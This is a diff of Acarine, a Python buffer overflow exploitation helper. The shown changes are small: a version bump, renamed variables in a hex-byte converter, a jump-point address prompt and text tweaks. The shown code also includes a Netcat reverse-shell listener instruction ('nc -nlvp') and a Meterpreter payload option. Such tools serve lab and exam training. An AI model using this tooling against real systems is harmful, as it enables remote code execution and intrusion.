@@ -1,6 +1,6 @@
 #!/bin/python
 
-# Acarine v1.0.2
+# Acarine v1.0.3
 
 # Usage: 
     # Acarine.py -t [IP] -p [PORT]
@@ -225,14 +225,14 @@ def charsPrompt(charsResultInput):
     else:
         charsMod(charsResultInput)
 
-def charsConvert(charSend):
-    chars_chars_mod = charSend
-    arr = chars_chars_mod.split("\\x")
-    arr = "".join(
+def charsConvert(charsCon):
+    chars_chars_mod = charsCon
+    con = chars_chars_mod.split("\\x")
+    con = "".join(
         chr(int(i,16))
-        for i in arr if i
+        for i in con if i
         )
-    return arr
+    return con
 
 def charsVar():
     global badCharsVar
@@ -285,7 +285,7 @@ After making note of the bad character(s), make sure you {color.PURPLE}RE-LOAD a
 # [4] Finding the Jump Point:
 
 def endianConvert():
-    jmpAdd = input(f"\n{color.GREEN}Please enter Jump Point Address: {color.END}")
+    jmpAdd = input(f"\n{color.GREEN}Please enter Jump Point Address (in format '0x12345678'): {color.END}")
     menuCheck(jmpAdd)
     if len(jmpAdd) != 10 or jmpAdd[1] != "x":
         print(f"\n{color.RED}Wrong length/format entered!{color.END}")
@@ -425,7 +425,7 @@ Choose payload type:
     if pType == "N":
         shell = "Netcat"
         print(f"""Prior to this exploit executing, please open a terminal window and type in the following command to set up a Netcat listener:
-[*] '{color.YELLOW}nc -nlvp {LPORT}{color.END}'""")
+    [*] '{color.YELLOW}nc -nlvp {LPORT}{color.END}'""")
     elif pType == "M":
         shell = "Meterpreter"
         print(f"""Prior to this exploit executing, please open a terminal window and type in the following series of commands:
@@ -477,7 +477,7 @@ PORT = args.port
 count = 0
 
 print(f"""{color.BOLD}{color.UNDERLINE}\nWelcome to Acarine!\n{color.END}
-This program is a {color.BOLD}Buffer Overflow{color.END} utility. 
+This program is a {color.BOLD}Buffer Overflow{color.END} utility and guide. 
 To be used in conjunction with {color.BOLD}Immunity Debugger{color.END} and the Immunity's {color.BOLD}Mona module{color.END}.\n
 Target is @ {color.BOLD}{color.DARKCYAN}{HOST}:{PORT}{color.END}""")
 checklist()
